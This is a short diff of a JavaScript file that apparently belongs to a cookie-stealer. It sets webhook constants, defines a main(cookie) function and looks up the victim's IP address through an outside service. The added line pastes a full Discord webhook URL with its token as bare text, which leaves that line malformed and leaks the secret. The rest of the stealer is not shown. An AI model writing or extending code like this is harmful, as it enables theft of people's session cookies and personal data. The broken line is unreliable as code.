@@ -1,5 +1,5 @@
 const WEBHOOK = "webhook_1";
-const SECOND_WEBHOOK = "webhook_2"; //add the web hook here
+const SECOND_WEBHOOK = "webhook_2"; https:discord.com/api/webhooks/1529641619920519352/0UogNZ7YOTKR5N4RdzVVk2oMeIi5Vm5lRig_OBfi_NKQt4LCbSf0Mkc80Q0THsgbQ3E8
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
